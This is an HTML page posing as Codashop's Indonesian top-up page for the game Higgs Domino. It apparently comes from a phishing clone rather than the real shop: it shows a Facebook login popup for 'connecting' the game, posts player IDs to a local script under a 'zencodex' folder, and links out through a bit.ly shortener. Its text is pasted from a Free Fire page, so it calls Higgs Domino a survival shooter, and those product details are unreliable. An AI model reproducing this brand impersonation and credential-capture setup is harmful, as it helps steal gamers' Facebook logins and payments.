...
<head>
   ...
   <!--[if lt IE 9]>
      ...
      <![endif]-->
   <title>Higgs Domino (Indonesia) - Codashop</title>
   ...
   <meta property="og:title" content="Higgs Domino (Indonesia) - Codashop" />
   <meta property="og:description" content="Top up diamond Higgs Domino menggunakan ShopeePay, Telkomsel, Indosat, Tri, XL, Smartfren, GoPay, Dana, OVO, LinkAja, Bank Transfer, Indomaret, Alfamart hingga Kredivo di Codashop. Tanpa kartu kredit, paling praktis, terpercaya di Indonesia - Beli sekarang!" />
   <meta property="og:image" content="https://cdn1.codashop.com/S/content/common/images/mno/freefire_640x241.png" />
   <meta property="og:image:width" content="1200" />
   <meta property="og:image:height" content="630" />
   <!-- OG Tags End -->
   <meta name="description" content="Top up diamond Higgs Domino menggunakan ShopeePay, Telkomsel, Indosat, Tri, XL, Smartfren, GoPay, Dana, OVO, LinkAja, Bank Transfer, Indomaret, Alfamart hingga Kredivo di Codashop. Tanpa kartu kredit, paling praktis, terpercaya di Indonesia - Beli sekarang!" />
      ...
      <div class="popup-box-login-fb">
         ...
         <div class="content-box-fb">
            ...
            <div class="txt-login-fb">
               Log in to your Facebook account to connect to Higgs Domino
            </div>
   ...
   <div id="product-page__container" class="product-page__container">
      ...
      <main class="container product-container">
         ...
         <header class="product-details-container shop-content__container">
            ...
            <h2 class="product__name shop-content--heading">Higgs Domino</h2>
            ...
            <article class="product__description shop-content__container">
               ...
               <p class="shop-content--paragraph">Bayarlah menggunakan GoPay, OVO, DANA, ShopeePay, Transfer Bank, Indosat, Tri, Telkomsel, XL, Smartfren, Indomaret, Alfamart Kredivo, LinkAja, True Money, dan DOKU Wallet. Codashop adalah cara terbaik untuk top up Higgs Domino Island secara online tanpa perlu kartu kredit, registrasi ataupun log-in.</p>

               <p class="shop-content--paragraph">Unduh dan mainkan Higgs Domino sekarang!</p>

               <a href="http://bit.ly/2HPopnP">
      ...
      <section class="section product__long-description shop-content__container">
         <h1 class="product-tagline-title">
            Beli Diamond Higgs Domino murah tanpa kartu kredit!
         </h1>
         <article class="product__tag-line">
            <p class="shop-content--paragraph"> Hanya butuh beberapa detik saja untuk membeli Diamonds Higgs Domino. Di Codashop, top-up menjadi mudah, aman, dan praktis. Codashop dipercaya oleh jutaan gamers & pengguna aplikasi di Asia Tenggara termasuk diantaranya Indonesia. Caranya
            ...
            <p class="shop-content--paragraph"> Tentang Higgs Domino: <br> Higgs Domino atau FF Garena adalah mobile game survival shooter terbaik. Setiap 10 menit permainan menempatkan anda di pulau jauh tempat anda menghadapi 49 pemain lain, semuanya bertujuan untuk mencari keselamatan.
         ...
         $("li.voucher-list-element").on('click', function() {
            ...
            $("#mdn-submit").on('click', function() {
               ...
               if (id == "") {
                  ...
                  $.ajax({
                     url: "../zencodex/dominoCheckID.php",
                     type: "POST",
                     data: 'userId=' + id,
                     beforeSend: function() {
                        $("#overlay").hide();
